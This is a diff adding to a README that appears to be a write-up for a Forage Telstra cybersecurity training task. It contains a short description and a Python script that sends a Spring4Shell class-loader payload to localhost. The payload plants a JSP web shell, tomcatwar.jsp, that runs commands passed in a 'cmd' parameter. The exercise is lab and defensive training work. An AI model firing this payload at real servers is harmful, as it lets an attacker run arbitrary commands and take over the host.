@@ -101,12 +101,63 @@ https://github.com/craig/SpringCore0day/blob/main/exp.py
 <img width="1108" alt="Screenshot 2025-03-18 at 6 25 01 PM" src="https://github.com/user-attachments/assets/57b1c854-c409-4efc-ae83-47b45ff7e347" />
 
 
+The script you've provided automates a series of HTTP POST requests to a local server running on localhost at port 8000. It sends a payload intended to test for a specific security vulnerability by interacting with a web application. The payload appears to be crafted to exploit potential security weaknesses in the application's request handling.
+
+The script performs five iterations, each sending a POST request to /tomcatwar.jsp with the crafted payload and specific headers. After each request, it prints the response status code. At the end of the test, it reports the number of successful responses received.
+
+	# www.theforage.com - Telstra Cyber Task 3
+	# Test Requester
+	
+	
+	import http.client
+	
+	
+	host = "localhost"
+	port = 8000
+	
+	
+	def main():
+	    target = "%s:%s" % (host, port)
+	    print("[+] Beginning test requests to: %s" % target)
+	    successful_responses = 0
+	
+	
+	    for x in range (0,5):
+	        payload = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+	        print("[%s/5]: Making test request to %s with payload: %s" % (x + 1, target, payload))
+	        conn = http.client.HTTPConnection(target)
+	
+	
+	        conn.request('POST', '/tomcatwar.jsp', payload,  {
+	            "suffix": "%>//",
+	            "c1": "Runtime",
+	            "c2": "<%",
+	            "DNT": "1",
+	            "Content-Type": "application/x-www-form-urlencoded",
+	        })
+	        response = conn.getresponse()
+	        status_code = response.status
+	        if status_code == 200:
+	            successful_responses += 1
+	        print("Response status code: %s" % status_code)
+	        print("=============")
+	
+	
+	    print("[+] Test completed.")
+	    print("[+] Successful responses: %s/5" % successful_responses)
+	
+	
+	if __name__ == "__main__":
+	    main()
+
+
+<img width="1108" alt="Screenshot 2025-03-18 at 6 29 08 PM" src="https://github.com/user-attachments/assets/54a1066d-77a5-453d-9766-42469bba1ede" />
+
 
   
 
 
 
-  Firewall Rule
 
 [T4 - Model Answer.pdf](https://github.com/user-attachments/files/19324453/T4.-.Model.Answer.pdf)
 
